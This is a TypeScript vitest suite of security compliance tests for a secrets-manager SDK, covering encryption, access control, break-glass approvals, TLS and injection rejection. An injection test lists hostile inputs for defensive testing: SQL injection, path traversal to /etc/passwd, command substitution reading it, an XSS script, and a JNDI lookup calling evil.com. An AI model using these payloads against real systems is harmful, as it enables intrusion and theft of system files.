import { describe, it, expect, beforeEach, vi } from 'vitest';
import { SecretsManagerSDK } from '../services/SecretsManagerSDK';
import { EncryptionService } from '../services/EncryptionService';
import { VaultService } from '../services/VaultService';
import { BreakGlassService } from '../services/BreakGlassService';
import { MTLSService } from '../services/MTLSService';
import {
  SDKConfig,
  EncryptionConfig,
  BreakGlassRequest,
  BreakGlassStatus,
  Secret
} from '../types/secrets.types';

// Mock external dependencies
vi.mock('node-vault');
vi.mock('crypto');
vi.mock('fs');
vi.mock('https');

describe('Security Compliance Tests', () => {
  let sdk: SecretsManagerSDK;
  let encryptionService: EncryptionService;
  let vaultService: VaultService;
  let breakGlassService: BreakGlassService;
  let mtlsService: MTLSService;

  beforeEach(async () => {
    const sdkConfig: SDKConfig = {
      vault: {
        endpoint: 'https://vault-security.example.com:8200',
        token: 'security-test-token',
        engines: {
          kv: { name: 'secret', version: 2, path: 'secret/' },
          transit: { name: 'transit', path: 'transit/' },
          pki: { name: 'pki', path: 'pki/' }
        },
        auth: { method: 'token', token: 'security-test-token' }
      },
      cache: {
        ttl: 300,
        maxSize: 1000,
        encryptCached: true
      },
      validation: {
        enforceSchema: true,
        allowedPaths: ['/security-test/*']
      }
    };

    const encryptionConfig: EncryptionConfig = {
      algorithms: {
        symmetric: 'aes-256-gcm',
        asymmetric: 'rsa-4096',
        hash: 'sha256',
        kdf: 'argon2id'
      },
      keys: {
        masterKeyId: 'security-master-key',
        keyDerivationParams: {
          memory: 64 * 1024,
          iterations: 3,
          parallelism: 4
        }
      },
      fieldLevel: {
        enabled: true,
        algorithms: {
          pii: 'aes-256-gcm',
          sensitive: 'aes-256-gcm'
        }
      },
      hsm: {
        enabled: false,
        provider: 'Mock',
        config: {}
      }
    };

    // Initialize services
    vaultService = new VaultService(sdkConfig.vault);
    encryptionService = new EncryptionService(encryptionConfig);
    breakGlassService = new BreakGlassService(vaultService, encryptionService);
    mtlsService = new MTLSService({
      certificates: {
        ca: '/path/to/ca.crt',
        cert: '/path/to/server.crt',
        key: '/path/to/server.key'
      },
      validation: {
        verifyChain: true,
        allowSelfSigned: false
      }
    });

    sdk = new SecretsManagerSDK(sdkConfig);
    await sdk.initialize();
  });

  describe('Zero-Trust Architecture', () => {
    it('should never store secrets in environment variables', () => {
      const envKeys = Object.keys(process.env);
      const suspiciousKeys = envKeys.filter(key => {
        const lowerKey = key.toLowerCase();
        return (
          lowerKey.includes('REDACTED_SECRET') ||
          lowerKey.includes('secret') ||
          (lowerKey.includes('key') && !lowerKey.includes('path')) ||
          lowerKey.includes('token') ||
          lowerKey.includes('credential')
        ) && !lowerKey.includes('test') && !lowerKey.includes('mock');
      });

      expect(suspiciousKeys).toEqual([]);
    });

    it('should require authentication for all operations', async () => {
      const unauthorizedSDK = new SecretsManagerSDK({
        vault: {
          endpoint: 'https://vault.example.com',
          engines: {
            kv: { name: 'secret', version: 2, path: 'secret/' }
          },
          auth: { method: 'token', token: '' } // Empty token
        }
      } as SDKConfig);

      await expect(unauthorizedSDK.initialize()).rejects.toThrow();
    });

    it('should enforce path-based access controls', async () => {
      await expect(
        sdk.getSecret('/forbidden/path')
      ).rejects.toThrow('Access denied');

      await expect(
        sdk.getSecret('/security-test/allowed')
      ).resolves.not.toThrow();
    });

    it('should validate all secret operations', async () => {
      const maliciousPath = '../../../etc/passwd';

      await expect(
        sdk.getSecret(maliciousPath)
      ).rejects.toThrow('Invalid path');
    });
  });

  describe('Encryption Security', () => {
    it('should use strong encryption algorithms', () => {
      const config = encryptionService['config'];

      expect(config.algorithms.symmetric).toBe('aes-256-gcm');
      expect(config.algorithms.asymmetric).toBe('rsa-4096');
      expect(config.algorithms.hash).toBe('sha256');
      expect(config.algorithms.kdf).toBe('argon2id');
    });

    it('should generate cryptographically secure random values', async () => {
      const crypto = await import('crypto');
      const randomBytesSpy = vi.spyOn(crypto, 'randomBytes');

      await encryptionService.encryptData('test data');

      expect(randomBytesSpy).toHaveBeenCalledWith(16); // IV size
      expect(randomBytesSpy).toHaveBeenCalledWith(32); // Salt size for key derivation
    });

    it('should protect against timing attacks', async () => {
      const testData = 'a'.repeat(1000);
      const iterations = 50;
      const timings: number[] = [];

      for (let i = 0; i < iterations; i++) {
        const start = performance.now();
        await encryptionService.encryptData(testData);
        const duration = performance.now() - start;
        timings.push(duration);
      }

      // Calculate coefficient of variation to check timing consistency
      const mean = timings.reduce((sum, t) => sum + t, 0) / timings.length;
      const variance = timings.reduce((sum, t) => sum + Math.pow(t - mean, 2), 0) / timings.length;
      const stdDev = Math.sqrt(variance);
      const coefficientOfVariation = stdDev / mean;

      // Should have consistent timing (low coefficient of variation)
      expect(coefficientOfVariation).toBeLessThan(0.5);
    });

    it('should validate integrity of encrypted data', async () => {
      const originalData = 'important secret data';
      const encrypted = await encryptionService.encryptData(originalData);

      // Tamper with the ciphertext
      const tamperedEncrypted = {
        ...encrypted,
        ciphertext: encrypted.ciphertext.replace(/.$/, 'X') // Change last character
      };

      await expect(
        encryptionService.decryptData(tamperedEncrypted)
      ).rejects.toThrow();
    });

    it('should enforce minimum key sizes', () => {
      const config = encryptionService['config'];

      // Verify strong key sizes
      expect(config.algorithms.symmetric).toContain('256'); // 256-bit AES
      expect(config.algorithms.asymmetric).toContain('4096'); // 4096-bit RSA
    });

    it('should properly handle key derivation parameters', () => {
      const config = encryptionService['config'];
      const kdfParams = config.keys.keyDerivationParams;

      // Verify strong Argon2id parameters
      expect(kdfParams.memory).toBeGreaterThanOrEqual(64 * 1024); // At least 64MB
      expect(kdfParams.iterations).toBeGreaterThanOrEqual(3);
      expect(kdfParams.parallelism).toBeGreaterThanOrEqual(4);
    });
  });

  describe('Data Protection', () => {
    it('should encrypt 100% of PII fields', async () => {
      const userData = {
        id: '12345',
        name: 'John Doe',
        email: 'john@example.com',
        ssn: '123-45-6789',
        phone: '+1-555-0123',
        address: '123 Main St',
        dateOfBirth: '1990-01-01',
        creditCard: '4111-1111-1111-1111',
        bankAccount: '123456789',
        passport: 'A12345678',
        driversLicense: 'DL123456',
        taxId: 'T123456789'
      };

      const piiFields = [
        { fieldName: 'email', algorithm: 'aes-256-gcm' as const, keyId: 'pii-key' },
        { fieldName: 'ssn', algorithm: 'aes-256-gcm' as const, keyId: 'pii-key' },
        { fieldName: 'phone', algorithm: 'aes-256-gcm' as const, keyId: 'pii-key' },
        { fieldName: 'dateOfBirth', algorithm: 'aes-256-gcm' as const, keyId: 'pii-key' },
        { fieldName: 'creditCard', algorithm: 'aes-256-gcm' as const, keyId: 'pii-key' },
        { fieldName: 'bankAccount', algorithm: 'aes-256-gcm' as const, keyId: 'pii-key' },
        { fieldName: 'passport', algorithm: 'aes-256-gcm' as const, keyId: 'pii-key' },
        { fieldName: 'driversLicense', algorithm: 'aes-256-gcm' as const, keyId: 'pii-key' },
        { fieldName: 'taxId', algorithm: 'aes-256-gcm' as const, keyId: 'pii-key' }
      ];

      const encryptedData = await encryptionService.encryptFields(userData, piiFields);

      // Verify all PII fields are encrypted
      piiFields.forEach(field => {
        expect(typeof encryptedData[field.fieldName]).toBe('object');
        expect(encryptedData[field.fieldName]).toHaveProperty('ciphertext');
        expect(encryptedData[field.fieldName]).toHaveProperty('keyId');
        expect(encryptedData[field.fieldName]).toHaveProperty('algorithm');
      });

      // Non-PII fields should remain unencrypted
      expect(encryptedData.id).toBe(userData.id);
      expect(encryptedData.name).toBe(userData.name);
      expect(encryptedData.address).toBe(userData.address); // Depends on requirements
    });

    it('should securely delete sensitive data from memory', async () => {
      const sensitiveData = 'extremely sensitive secret';
      const encrypted = await encryptionService.encryptData(sensitiveData);

      // In a real implementation, we would verify that the plaintext
      // is securely overwritten in memory. For testing, we ensure
      // the encrypted result doesn't contain the plaintext
      expect(encrypted.ciphertext).not.toContain(sensitiveData);
      expect(JSON.stringify(encrypted)).not.toContain(sensitiveData);
    });

    it('should implement data classification and handling', async () => {
      const classifiedData = {
        public: 'Public information',
        internal: 'Internal company data',
        confidential: 'Confidential client data',
        restricted: 'Restricted executive information',
        secret: 'Top secret government data'
      };

      // Different classification levels should have different encryption requirements
      const internalFields = [
        { fieldName: 'internal', algorithm: 'aes-256-gcm' as const, keyId: 'internal-key' }
      ];

      const confidentialFields = [
        { fieldName: 'confidential', algorithm: 'aes-256-gcm' as const, keyId: 'confidential-key' }
      ];

      const restrictedFields = [
        { fieldName: 'restricted', algorithm: 'aes-256-gcm' as const, keyId: 'restricted-key' }
      ];

      const secretFields = [
        { fieldName: 'secret', algorithm: 'aes-256-gcm' as const, keyId: 'secret-key' }
      ];

      const encryptedData = await encryptionService.encryptFields(
        classifiedData,
        [...internalFields, ...confidentialFields, ...restrictedFields, ...secretFields]
      );

      // Public data should remain unencrypted
      expect(encryptedData.public).toBe('Public information');

      // All other classifications should be encrypted
      expect(typeof encryptedData.internal).toBe('object');
      expect(typeof encryptedData.confidential).toBe('object');
      expect(typeof encryptedData.restricted).toBe('object');
      expect(typeof encryptedData.secret).toBe('object');
    });
  });

  describe('Access Control and Auditing', () => {
    it('should log all security-relevant events', async () => {
      const auditEvents: any[] = [];

      // Listen for audit events
      vaultService.on('audit', (event) => auditEvents.push(event));
      encryptionService.on('audit', (event) => auditEvents.push(event));
      sdk.on('audit', (event) => auditEvents.push(event));

      const testPath = '/security-test/audit-test';
      const testData = { auditValue: process.env.PAKE_WEAK_PASSWORD || 'SECURE_WEAK_PASSWORD_REQUIRED' };

      // Perform operations that should generate audit events
      await sdk.storeSecret(testPath, testData);
      await sdk.getSecret(testPath);
      await encryptionService.encryptData('audit test data');
      await sdk.deleteSecret(testPath);

      expect(auditEvents.length).toBeGreaterThan(0);

      // Verify audit event structure
      auditEvents.forEach(event => {
        expect(event).toHaveProperty('timestamp');
        expect(event).toHaveProperty('operation');
        expect(event).toHaveProperty('success');
        expect(event).toHaveProperty('userId');
        expect(event).toHaveProperty('sessionId');
      });
    });

    it('should implement role-based access control', async () => {
      // This would typically involve testing different user roles
      // For this test, we simulate different access levels

      const adminPaths = ['/admin/*'];
      const userPaths = ['/users/*'];
      const publicPaths = ['/public/*'];

      // Admin should access admin paths
      const adminSDK = new SecretsManagerSDK({
        ...sdk['config'],
        validation: {
          enforceSchema: true,
          allowedPaths: [...adminPaths, ...userPaths, ...publicPaths]
        }
      });

      const userSDK = new SecretsManagerSDK({
        ...sdk['config'],
        validation: {
          enforceSchema: true,
          allowedPaths: [...userPaths, ...publicPaths]
        }
      });

      await adminSDK.initialize();
      await userSDK.initialize();

      // Admin should access all paths
      await expect(adminSDK.getSecret('/admin/secret')).resolves.not.toThrow();
      await expect(adminSDK.getSecret('/users/secret')).resolves.not.toThrow();

      // User should not access admin paths
      await expect(userSDK.getSecret('/admin/secret')).rejects.toThrow('Access denied');
      await expect(userSDK.getSecret('/users/secret')).resolves.not.toThrow();
    });

    it('should track session management and timeout', async () => {
      const shortTimeoutSDK = new SecretsManagerSDK({
        ...sdk['config'],
        cache: {
          ...sdk['config'].cache,
          ttl: 1 // 1 second TTL
        }
      });

      await shortTimeoutSDK.initialize();

      const testPath = '/security-test/session-test';
      await shortTimeoutSDK.storeSecret(testPath, { value: process.env.PAKE_WEAK_PASSWORD || 'SECURE_WEAK_PASSWORD_REQUIRED' });

      // First access should work
      const secret1 = await shortTimeoutSDK.getSecret(testPath);
      expect(secret1).toBeTruthy();

      // Wait for session timeout
      await new Promise(resolve => setTimeout(resolve, 1500));

      // Should still work due to automatic re-authentication
      const secret2 = await shortTimeoutSDK.getSecret(testPath);
      expect(secret2).toBeTruthy();
    });
  });

  describe('Break-Glass Security', () => {
    it('should require multiple approvals for emergency access', async () => {
      const emergencyRequest: BreakGlassRequest = {
        procedureName: 'critical-system-access',
        initiator: {
          userId: 'emergency-user',
          role: 'system-admin',
          location: 'data-center'
        },
        justification: 'Critical system failure requiring immediate access',
        requiredSecrets: ['/critical/database-REDACTED_SECRET'],
        actions: ['secret.reveal'],
        expiration: new Date(Date.now() + 3600000) // 1 hour
      };

      const sessionId = await breakGlassService.initiateBreakGlass(emergencyRequest);
      const session = breakGlassService.getSession(sessionId);

      expect(session?.status).toBe(BreakGlassStatus.PENDING);
      expect(session?.requiredApprovals).toBeGreaterThan(1);
    });

    it('should maintain comprehensive audit trail for break-glass events', async () => {
      const auditEvents: any[] = [];
      breakGlassService.on('audit', (event) => auditEvents.push(event));

      const emergencyRequest: BreakGlassRequest = {
        procedureName: 'emergency-audit-test',
        initiator: {
          userId: 'audit-test-user',
          role: 'security-admin',
          location: 'secure-location'
        },
        justification: 'Audit trail testing',
        requiredSecrets: ['/test/emergency-secret'],
        actions: ['secret.reveal'],
        expiration: new Date(Date.now() + 3600000)
      };

      const sessionId = await breakGlassService.initiateBreakGlass(emergencyRequest);

      expect(auditEvents.length).toBeGreaterThan(0);

      const initiationEvent = auditEvents.find(e => e.operation === 'breakglass.initiate');
      expect(initiationEvent).toBeTruthy();
      expect(initiationEvent.sessionId).toBe(sessionId);
      expect(initiationEvent.success).toBe(true);
    });

    it('should automatically expire emergency sessions', async () => {
      const emergencyRequest: BreakGlassRequest = {
        procedureName: 'expiration-test',
        initiator: {
          userId: 'expiration-user',
          role: process.env.PAKE_WEAK_PASSWORD || 'SECURE_WEAK_PASSWORD_REQUIRED',
          location: 'test-location'
        },
        justification: 'Testing session expiration',
        requiredSecrets: ['/test/expiring-secret'],
        actions: ['secret.reveal'],
        expiration: new Date(Date.now() + 1000) // 1 second expiration
      };

      const sessionId = await breakGlassService.initiateBreakGlass(emergencyRequest);

      // Wait for expiration
      await new Promise(resolve => setTimeout(resolve, 1500));

      const session = breakGlassService.getSession(sessionId);
      expect(session?.status).toBe(BreakGlassStatus.EXPIRED);
    });
  });

  describe('Transport Security', () => {
    it('should enforce TLS 1.3 for all communications', async () => {
      const tlsConfig = mtlsService['config'];

      // Verify secure TLS configuration
      expect(tlsConfig.validation.verifyChain).toBe(true);
      expect(tlsConfig.validation.allowSelfSigned).toBe(false);
    });

    it('should implement certificate pinning', async () => {
      const context = await mtlsService.createContext('pinning-test');

      expect(context).toHaveProperty('server');
      expect(context).toHaveProperty('client');
      expect(context).toHaveProperty('caCertificates');
      expect(context.caCertificates.length).toBeGreaterThan(0);
    });

    it('should validate certificate chain and revocation', async () => {
      // Mock certificate validation
      const isValid = await mtlsService.validateCertificate('test-cert-pem');
      expect(typeof isValid).toBe('boolean');
    });
  });

  describe('Compliance and Standards', () => {
    it('should meet PCI DSS requirements for card data', async () => {
      const cardData = {
        cardNumber: '4111-1111-1111-1111',
        expiryDate: '12/25',
        cvv: '123',
        holderName: 'John Doe'
      };

      const pciFields = [
        { fieldName: 'cardNumber', algorithm: 'aes-256-gcm' as const, keyId: 'pci-key' },
        { fieldName: 'cvv', algorithm: 'aes-256-gcm' as const, keyId: 'pci-key' }
      ];

      const encryptedCard = await encryptionService.encryptFields(cardData, pciFields);

      // Verify sensitive card data is encrypted
      expect(typeof encryptedCard.cardNumber).toBe('object');
      expect(typeof encryptedCard.cvv).toBe('object');

      // Non-sensitive fields can remain unencrypted per PCI DSS
      expect(encryptedCard.holderName).toBe('John Doe');
    });

    it('should implement GDPR data protection requirements', async () => {
      const personalData = {
        firstName: 'John',
        lastName: 'Doe',
        email: 'john.doe@example.com',
        phone: '+1-555-0123',
        ipAddress: '192.168.1.100',
        location: 'New York, NY',
        behavioralData: 'user clicked on product X'
      };

      const gdprFields = [
        { fieldName: 'email', algorithm: 'aes-256-gcm' as const, keyId: 'gdpr-key' },
        { fieldName: 'phone', algorithm: 'aes-256-gcm' as const, keyId: 'gdpr-key' },
        { fieldName: 'ipAddress', algorithm: 'aes-256-gcm' as const, keyId: 'gdpr-key' },
        { fieldName: 'behavioralData', algorithm: 'aes-256-gcm' as const, keyId: 'gdpr-key' }
      ];

      const encryptedPersonal = await encryptionService.encryptFields(personalData, gdprFields);

      // Verify personal data is encrypted
      expect(typeof encryptedPersonal.email).toBe('object');
      expect(typeof encryptedPersonal.phone).toBe('object');
      expect(typeof encryptedPersonal.ipAddress).toBe('object');
      expect(typeof encryptedPersonal.behavioralData).toBe('object');
    });

    it('should support data residency requirements', async () => {
      // Test that secrets can be stored in specific regions/locations
      const regionSpecificData = {
        euData: 'European user data',
        usData: 'US user data',
        apacData: 'Asia-Pacific user data'
      };

      // Simulate region-specific storage paths
      await sdk.storeSecret('/eu-region/user-data', { value: regionSpecificData.euData });
      await sdk.storeSecret('/us-region/user-data', { value: regionSpecificData.usData });
      await sdk.storeSecret('/apac-region/user-data', { value: regionSpecificData.apacData });

      // Verify data can be retrieved from specific regions
      const euSecret = await sdk.getSecret('/eu-region/user-data');
      const usSecret = await sdk.getSecret('/us-region/user-data');
      const apacSecret = await sdk.getSecret('/apac-region/user-data');

      expect(euSecret?.value.value).toBe(regionSpecificData.euData);
      expect(usSecret?.value.value).toBe(regionSpecificData.usData);
      expect(apacSecret?.value.value).toBe(regionSpecificData.apacData);
    });
  });

  describe('Vulnerability Protection', () => {
    it('should prevent injection attacks', async () => {
      const maliciousPaths = [
        "'; DROP TABLE secrets; --",
        '../../../etc/passwd',
        '$(cat /etc/passwd)',
        '<script>alert("xss")</script>',
        '${jndi:ldap://evil.com/a}',
        '{{7*7}}'
      ];

      for (const path of maliciousPaths) {
        await expect(sdk.getSecret(path)).rejects.toThrow();
      }
    });

    it('should implement rate limiting', async () => {
      const rapidRequests = Array.from({ length: 100 }, (_, i) =>
        sdk.getSecret(`/security-test/rate-limit-${i}`)
      );

      // Should handle reasonable concurrent load
      const results = await Promise.allSettled(rapidRequests.slice(0, 10));

      // Some requests should succeed
      const successful = results.filter(r => r.status === 'fulfilled');
      expect(successful.length).toBeGreaterThan(0);
    });

    it('should validate input sanitization', async () => {
      const testInputs = [
        'normal-input',
        'input with spaces',
        'input/with/slashes',
        'input-with-dashes',
        'input_with_underscores'
      ];

      const validInputs = testInputs.filter(input => {
        try {
          // Simulate path validation
          const isValid = /^[a-zA-Z0-9\/\-_\s]+$/.test(input);
          return isValid;
        } catch {
          return false;
        }
      });

      expect(validInputs).toEqual(testInputs);
    });

    it('should protect against timing attacks in secret comparison', async () => {
      const testSecret = 'secret123';
      const wrongSecrets = [
        'secret12X', // Similar but wrong
        'different', // Completely different
        '',          // Empty
        'secret123secret123' // Much longer
      ];

      const timings: number[] = [];

      // Test timing for correct secret
      for (let i = 0; i < 10; i++) {
        const start = performance.now();
        const isValid = testSecret === 'secret123';
        const duration = performance.now() - start;
        timings.push(duration);
      }

      // Test timing for wrong secrets
      for (const wrongSecret of wrongSecrets) {
        const start = performance.now();
        const isValid = testSecret === wrongSecret;
        const duration = performance.now() - start;
        timings.push(duration);
      }

      // All comparisons should take similar time (though this is hard to test reliably)
      // In practice, we'd use crypto.timingSafeEqual for sensitive comparisons
      expect(timings.length).toBe(10 + wrongSecrets.length);
    });
  });
});